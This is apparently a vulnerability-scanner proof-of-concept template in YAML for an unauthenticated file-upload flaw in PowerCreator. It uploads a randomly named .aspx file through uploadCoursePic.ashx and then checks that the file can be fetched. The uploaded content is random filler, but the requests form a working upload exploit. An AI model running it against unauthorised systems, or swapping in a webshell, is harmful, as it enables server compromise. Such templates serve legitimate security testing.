name: poc-yaml-powercreator-upload-2
set:
  content: randomLowercase(8)
  randname: randomLowercase(4)
rules:
  - method: POST
    path: /upload/uploadCoursePic.ashx
    follow_redirects: false
    headers:
      Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
      Content-Disposition: form-data;name="file1";filename="{{randname}}.aspx";
    body: "-----------------------------20873900192357278038549710136\nContent-Disposition: form-data; name=\"file1\"; filename=\"{{randname}}.aspx\"\nContent-Type: application/octet-stream\n\n{{content}}\n-----------------------------20873900192357278038549710136--\n"
    search: |
      -2/(?P<path>.+?).ASPX
    expression: response.status == 200 && response.body.bcontains(b".ASPX")
  - method: GET
    path: /{{path}}.ASPX
    follow_redirects: false
    expression: response.status == 200
